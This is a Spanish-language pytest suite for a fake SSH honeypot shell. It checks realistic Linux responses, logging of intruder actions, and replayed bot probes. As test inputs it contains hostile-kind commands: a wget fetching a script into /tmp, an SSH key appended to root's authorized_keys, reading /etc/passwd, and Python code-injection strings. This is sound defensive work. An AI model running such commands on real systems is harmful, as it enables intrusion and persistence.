"""Tests de la shell falsa (fake_shell.py y shell_interp.py).

La idea de fondo: un honeypot se delata por detalles. Cada test de abajo fija una
respuesta que un Linux real daria, para que un cambio futuro no vuelva a romperla sin
que nadie se entere. Varios casos salen de comandos que llegaron de verdad al honeypot
(se marcan como "real").

get_response() devuelve la salida EXACTA, con su salto de linea final: un `printf abc`
sin \\n no termina en salto, igual que en Linux. Por eso casi todas las comparaciones de
abajo terminan en "\\n".
"""
import re
from pathlib import Path

import pytest

import fake_shell
import shell_interp
from weak_passwords import CLAVES_DEBILES

KERNEL = "5.15.0-1034-aws"
VERSION = "#38-Ubuntu SMP Mon Mar 20 15:41:27 UTC 2023"


# --- uname ----------------------------------------------------------------------

def test_uname_real_de_bot_go(shell):
    # real: cliente SSH-2.0-Go, 83 veces hasta el 29 de octubre
    r, _ = shell("uname -s -v -n -r -m")
    assert r == f"Linux ubuntu-server {KERNEL} {VERSION} x86_64\n"


def test_uname_a_coincide_con_el_diccionario(shell):
    r, _ = shell("uname -a")
    assert r == fake_shell.COMANDOS["uname -a"] + "\n"


def test_uname_sin_argumentos_es_el_nombre_del_kernel(shell):
    assert shell("uname")[0] == "Linux\n"


def test_uname_r(shell):
    assert shell("uname -r")[0] == KERNEL + "\n"


def test_uname_el_orden_de_las_opciones_no_cambia_la_salida(shell):
    assert shell("uname -r -s")[0] == f"Linux {KERNEL}\n"


def test_uname_opcion_invalida(shell):
    r, estado = shell("uname -z")
    assert r.startswith("uname: invalid option -- 'z'")
    assert estado["codigo"] == 1


# --- comandos desconocidos y codigos de salida ----------------------------------

def test_comando_inexistente(shell):
    r, estado = shell("foobar")
    assert r == "bash: foobar: command not found\n"
    assert estado["codigo"] == 127


def test_routeros_en_linux_real_no_existe(shell):
    # real: '/ip cloud print' (alguien buscando routers MikroTik)
    r, estado = shell("/ip cloud print")
    assert r == "bash: /ip: No such file or directory\n"
    assert estado["codigo"] == 127


def test_binario_con_ruta_relativa(shell):
    assert shell("./x.sh")[0] == "bash: ./x.sh: No such file or directory\n"


def test_codigo_de_salida_de_un_comando_fallido_dentro_de_sh_c(shell):
    _, estado = shell('sh -c "foobar"')
    assert estado["codigo"] == 127


# --- usuario, directorio y prompt -----------------------------------------------

def test_whoami_e_id_dependen_del_usuario(shell):
    assert shell("whoami", usuario="ubuntu")[0] == "ubuntu\n"
    assert shell("id", usuario="ubuntu")[0] == "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)\n"
    assert shell("id")[0] == "uid=0(root) gid=0(root) groups=0(root)\n"


def test_cd_y_pwd_son_coherentes(shell):
    _, estado = shell("cd /tmp")
    assert shell("pwd", estado=estado)[0] == "/tmp\n"


def test_cd_a_directorio_inexistente(shell):
    r, estado = shell("cd /nada")
    assert r == "bash: cd: /nada: No such file or directory\n"
    assert estado["cwd"] == "/root"


def test_usuario_normal_no_entra_a_root(shell):
    r, _ = shell("cd /root", usuario="ubuntu")
    assert r == "bash: cd: /root: Permission denied\n"


def test_el_home_depende_del_usuario(shell):
    assert shell("pwd", usuario="ubuntu")[0] == "/home/ubuntu\n"


def test_ls_de_la_raiz(shell):
    nombres = shell("ls /")[0].split()
    assert {"bin", "etc", "home", "tmp", "var"} <= set(nombres)


def test_prompt_root_y_usuario_normal():
    assert fake_shell._prompt("root", {"cwd": "/root"}) == "root@ubuntu-server:~# "
    assert fake_shell._prompt("root", {"cwd": "/tmp"}) == "root@ubuntu-server:/tmp# "
    assert fake_shell._prompt("ubuntu", {"cwd": "/home/ubuntu/x"}) == "ubuntu@ubuntu-server:~/x$ "


# --- falsos positivos de la deteccion de modificaciones ------------------------

def test_cat_etc_passwd_no_es_una_modificacion(shell, registro):
    # Bug real que ya tuvimos: la palabra 'passwd' disparaba "intento de modificacion"
    r, _ = shell("cat /etc/passwd")
    assert r.startswith("root:x:0:0:")
    assert registro == []


@pytest.mark.parametrize("cmd", ["chmod +x /tmp/x", "passwd root", "useradd bob", "crontab -e"])
def test_modificaciones_se_registran_y_no_imprimen_nada(shell, registro, cmd):
    r, _ = shell(cmd)
    assert r == ""
    assert len(registro) == 1
    assert "modificación del sistema" in registro[0][2]


# --- descargas -----------------------------------------------------------------

def test_wget_con_url_registra_y_captura(shell, registro, descargas):
    r, _ = shell("wget http://203.0.113.9/x.sh -O /tmp/x.sh")
    assert "saved [4312/4312]" in r
    assert descargas == [("http://203.0.113.9/x.sh", "203.0.113.7")]
    assert "descarga de http://203.0.113.9/x.sh" in registro[0][2]


def test_wget_sin_url(shell, registro, descargas):
    r, _ = shell("wget")
    assert r == "wget: missing URL\n"
    assert descargas == []
    assert "sin URL" in registro[0][2]


def test_wget_dentro_de_sh_c_se_ve_igual(shell, descargas):
    shell('sh -c "wget http://203.0.113.9/x.sh"')
    assert descargas == [("http://203.0.113.9/x.sh", "203.0.113.7")]


# --- comandos encadenados y sh -c ----------------------------------------------

def test_encadenado_con_and(shell):
    assert shell("cd /tmp && pwd")[0] == "/tmp\n"


def test_no_corta_dentro_de_comillas(shell):
    assert shell('echo "a;b" && pwd')[0] == "a;b\n/root\n"


def test_or_se_ejecuta_solo_si_el_anterior_fallo(shell):
    assert shell("foobar || echo ok")[0] == "bash: foobar: command not found\nok\n"


def test_and_no_se_ejecuta_si_el_anterior_fallo(shell):
    assert shell("foobar && echo no")[0] == "bash: foobar: command not found\n"


def test_sh_c_ejecuta_lo_de_adentro(shell):
    assert shell('sh -c "uname -r"')[0] == KERNEL + "\n"


def test_sh_sin_c_ni_archivo_no_imprime(shell):
    assert shell("sh")[0] == ""


def test_sh_con_archivo_inexistente(shell):
    assert shell("sh /tmp/x.sh")[0] == "sh: 0: Can't open /tmp/x.sh\n"


def test_limite_de_comandos_encadenados(shell):
    r, _ = shell("echo 1;" * 25)
    assert r.count("\n") == shell_interp.MAX_PARTES


def test_limite_de_profundidad_de_sh_c(shell):
    r, _ = shell('sh -c "echo hola"', estado={"cwd": "/root", "prof": fake_shell.MAX_PROFUNDIDAD})
    assert r == ""


def test_exit_cierra_la_sesion(shell):
    assert shell("exit")[0] is None


def test_exit_con_codigo(shell):
    r, estado = shell("exit 3")
    assert r is None
    assert estado["codigo"] == 3


def test_exit_al_final_de_una_cadena_deja_la_salida_y_marca_salir(shell):
    r, estado = shell("echo hola; exit")
    assert r == "hola\n"
    assert estado["salir"] is True


def test_exit_dentro_de_sh_c_no_cierra_la_sesion(shell):
    r, estado = shell('sh -c "exit"; echo seguimos')
    assert r == "seguimos\n"
    assert not estado.get("salir")


def test_echo_con_redireccion_no_imprime(shell):
    assert shell('echo "ssh-rsa AAAA" >> /root/.ssh/authorized_keys')[0] == ""


def test_echo_con_sustitucion_de_comandos_no_ejecuta_nada(shell):
    # $(id) no se ejecuta ni se resuelve: la shell no corre comandos de verdad
    assert "uid=" not in shell("echo $(id)")[0]


# --- echo, variables y parametros ----------------------------------------------

def test_echo_vacio_imprime_una_linea_en_blanco(shell):
    assert shell("echo")[0] == "\n"


def test_echo_junta_los_argumentos_con_un_espacio(shell):
    assert shell("echo a    b")[0] == "a b\n"
    assert shell('echo "x  y"')[0] == "x  y\n"


def test_echo_n_no_agrega_salto(shell):
    assert shell("echo -n hola")[0] == "hola"


def test_comilla_simple_dentro_de_comillas(shell):
    assert shell("""echo 'it'"'"'s'""")[0] == "it's\n"


def test_variables(shell):
    assert shell("A=5; echo $A")[0] == "5\n"
    assert shell("A=2 B=3; echo $((A*B))")[0] == "6\n"


def test_codigo_de_salida_con_signo_de_pregunta(shell):
    assert shell("foobar; echo $?")[0] == "bash: foobar: command not found\n127\n"


def test_set_y_shift(shell):
    assert shell("set -- a b c; echo $# $1; shift; echo $# $1")[0] == "3 a\n2 b\n"


# --- printf --------------------------------------------------------------------

@pytest.mark.parametrize("cmd, esperado", [
    ("printf '%s|%s\\n' a b", "a|b\n"),
    ("printf '%s\\n' a b c", "a\nb\nc\n"),              # el formato se repite mientras haya argumentos
    ("printf 'sin salto'", "sin salto"),               # printf no agrega salto de linea
    ("printf '%d' 42", "42"),
    ("printf '%5s|' ab", "   ab|"),
    ("printf '%-5s|' ab", "ab   |"),
    ("printf '%05d' 42", "00042"),
    ("printf '%x' 255", "ff"),
    ("printf '%b' 'a\\nb'", "a\nb"),
    ("printf '100%%'", "100%"),
    ("printf '%s|%s\\n' solo", "solo|\n"),              # faltan argumentos: queda vacio
    ("printf '%s' ''", ""),
])
def test_printf(shell, cmd, esperado):
    assert shell(cmd)[0] == esperado


def test_printf_sin_argumentos_es_un_error_de_uso(shell):
    r, estado = shell("printf")
    assert r.startswith("printf: usage:")
    assert estado["codigo"] == 2


def test_printf_con_redireccion_no_imprime(shell):
    assert shell("printf 'x' > /tmp/a")[0] == ""


# --- aritmetica ----------------------------------------------------------------

@pytest.mark.parametrize("expr, esperado", [
    ("2+3*4", "14"),
    ("(2+3)*4", "20"),
    ("1+(2*3)", "7"),
    ("119*477+3", "56766"),                  # real: la cuenta de uno de los examenes
    ("-7/2", "-3"),                          # la division trunca hacia cero, como en C
    ("-7%3", "-1"),
    ("2**10", "1024"),
    ("1<<4", "16"),
    ("6&3", "2"),
    ("6|3", "7"),
    ("6^3", "5"),
    ("9223372036854775807+1", "-9223372036854775808"),   # desborda a 64 bits con signo
])
def test_aritmetica(shell, expr, esperado):
    assert shell(f"echo $(({expr}))")[0] == esperado + "\n"


def test_aritmetica_division_por_cero(shell):
    r, estado = shell("echo $((1/0))")
    assert "division by 0" in r
    assert estado["codigo"] == 2


@pytest.mark.parametrize("expr", [
    "__import__('os').system('id')",         # intento de ejecutar codigo Python
    "().__class__",
    "open('/etc/passwd')",
    "9**9**9",                               # explotaria la memoria si se calculara
    "1<<100000",
    "(" * 150 + "1" + ")" * 150,
    "1+" * 300 + "1",                        # expresion demasiado larga
])
def test_aritmetica_rechaza_lo_que_no_es_aritmetica(shell, expr):
    r, estado = shell(f"echo $(({expr}))")
    assert "arithmetic expression" in r
    assert "uid=" not in r and "root:x" not in r
    assert estado["codigo"] == 2


# --- PID, funciones y aislamiento de sh -c -------------------------------------

def test_pid_de_la_shell_es_un_numero_estable(shell):
    a, b = shell("echo $$; echo $$")[0].split()
    assert a == b and a.isdigit()


def test_cada_sh_c_tiene_su_propio_pid(shell):
    a, b = shell("sh -c 'echo $$'; sh -c 'echo $$'")[0].split()
    assert a.isdigit() and b.isdigit() and a != b


def test_funcion_con_parametros(shell):
    assert shell("f() { echo $1-$2 ($#); }; f uno dos")[0] == "uno-dos (2)\n"


def test_funcion_que_se_llama_a_si_misma_termina(shell):
    r, _ = shell("f() { f; f; }; f")        # sin tope, esto no terminaria nunca
    assert isinstance(r, str)


def test_sh_c_no_hereda_parametros_ni_funciones(shell):
    r, _ = shell("set -- uno; f() { echo hola; }; sh -c 'echo $# \"$1\"'; sh -c 'f'")
    assert r == "0 \nbash: f: command not found\n"


def test_sh_c_no_deja_sus_funciones_afuera(shell):
    r, _ = shell("sh -c 'f() { echo hola; }'; f")
    assert r == "bash: f: command not found\n"


# --- El examen real de un bot --------------------------------------------------
# real: 245 comandos de este tipo hasta el 29 de octubre. Cada intento son 6 comandos
# 'sh -c' y un 'echo; echo marcador'. Un bot que corre esto comprueba que la shell CALCULE:
# antes de este cambio, cada uno de estos comandos respondia 'command not found'.
# Las lineas estan copiadas tal cual del log (solo se reemplazo el hash por HASH).

HASH = "b39c2c71df8f9ed54cbdac351074a6aa"
EXAMEN = [l.replace("HASH", HASH)
          for l in (Path(__file__).parent / "fixtures" / "examen_shell.txt").read_text(encoding="utf-8").splitlines()
          if l.strip()]
ESPERADO = [
    rf"\ncheck_{HASH}_small_control\|check_{HASH}\n",
    r"\ncheck_" + HASH + r"_small_math\|56766\n",
    r"\ncheck_" + HASH + r"_small_pid\|\d+\n",
    r"\ncheck_" + HASH + r"_small_positional\|2\|check_" + HASH + r"_arg1\|check_" + HASH + r"_arg2\n",
    r"\ncheck_" + HASH + r"_small_function\|check_" + HASH + r"_function_value\|1\n",
    r"\ncheck_" + HASH + r"_small_done\n",
    r"\ncheck_" + HASH + r"_transport_done\n",
]


def test_el_examen_tiene_los_siete_comandos():
    assert len(EXAMEN) == len(ESPERADO) == 7


@pytest.mark.parametrize("comando, esperado", list(zip(EXAMEN, ESPERADO)))
def test_examen_de_shell_comando_por_comando(shell, comando, esperado):
    r, estado = shell(comando)
    assert re.fullmatch(esperado, r), repr(r)
    assert estado["codigo"] == 0


def test_examen_de_shell_en_una_sola_sesion(shell):
    estado = {"cwd": "/root"}
    for comando, esperado in zip(EXAMEN, ESPERADO):
        r, estado = shell(comando, estado=estado)
        assert re.fullmatch(esperado, r), repr(r)


def test_examen_de_shell_los_seis_en_una_sola_orden(shell):
    # un bot tambien podria mandarlos juntos, separados por ;
    r, _ = shell("; ".join(EXAMEN[:6]))
    assert r.count("\n") == 12             # 6 salidas de 2 saltos cada una: linea en blanco antes y salto al final
    assert f"check_{HASH}_small_math|56766" in r


# --- Autenticacion creible -----------------------------------------------------

def test_clave_debil_entra_a_la_primera():
    clave = next(iter(CLAVES_DEBILES))
    assert fake_shell._debe_aceptar("203.0.113.1", clave) is True


def test_clave_fuerte_entra_recien_al_tercer_intento():
    ip, clave = "203.0.113.2", "no-es-una-clave-debil-9Z!"
    resultados = [fake_shell._debe_aceptar(ip, clave) for _ in range(4)]
    assert resultados == [False, False, True, False]   # tras aceptar, el contador se reinicia


def test_los_intentos_se_cuentan_por_ip():
    clave = "no-es-una-clave-debil-9Z!"
    fake_shell._debe_aceptar("203.0.113.3", clave)
    fake_shell._debe_aceptar("203.0.113.3", clave)
    assert fake_shell._debe_aceptar("203.0.113.4", clave) is False


def test_los_fallos_viejos_vencen():
    from datetime import datetime
    ip = "203.0.113.5"
    fake_shell._fallos[ip] = (2, datetime.now().timestamp() - fake_shell.VENTANA_SEG - 1)
    assert fake_shell._debe_aceptar(ip, "no-es-una-clave-debil-9Z!") is False


# --- Canal exec (lo que usan los bots) -----------------------------------------

class CanalFalso:
    def __init__(self):
        self.enviado = b""
        self.codigo = None
        self.cerrado = False

    def send(self, datos):
        self.enviado += datos

    def send_exit_status(self, codigo):
        self.codigo = codigo

    def close(self):
        self.cerrado = True


def test_exec_responde_registra_y_cierra(registro):
    canal = CanalFalso()
    fake_shell.manejar_exec(canal, "203.0.113.7", "root", "uname -s -v -n -r -m")
    assert canal.enviado == f"Linux ubuntu-server {KERNEL} {VERSION} x86_64\n".encode()
    assert b"\r" not in canal.enviado           # sin pty la salida termina en \n
    assert canal.codigo == 0
    assert canal.cerrado
    assert registro == [("203.0.113.7", "uname -s -v -n -r -m", "Comando por canal exec", "exec")]


def test_exec_propaga_el_codigo_de_salida():
    canal = CanalFalso()
    fake_shell.manejar_exec(canal, "203.0.113.7", "root", "foobar")
    assert canal.codigo == 127


def test_exec_limpia_el_nombre_de_usuario():
    canal = CanalFalso()
    fake_shell.manejar_exec(canal, "203.0.113.7", "ro ot;$", "whoami")
    assert canal.enviado == b"root\n"


def test_exec_recorta_comandos_enormes(registro):
    canal = CanalFalso()
    fake_shell.manejar_exec(canal, "203.0.113.7", "root", "echo " + "A" * 10000)
    assert len(registro[0][1]) == fake_shell.MAX_EXEC_LARGO


def test_exec_printf_sin_salto_final_no_agrega_uno():
    canal = CanalFalso()
    fake_shell.manejar_exec(canal, "203.0.113.7", "root", "printf abc")
    assert canal.enviado == b"abc"


def test_exec_del_marcador_de_transporte():
    # real: 'echo; echo marcador' llega por exec, no por sh -c
    canal = CanalFalso()
    fake_shell.manejar_exec(canal, "203.0.113.7", "root", EXAMEN[6])
    assert canal.enviado == f"\ncheck_{HASH}_transport_done\n".encode()
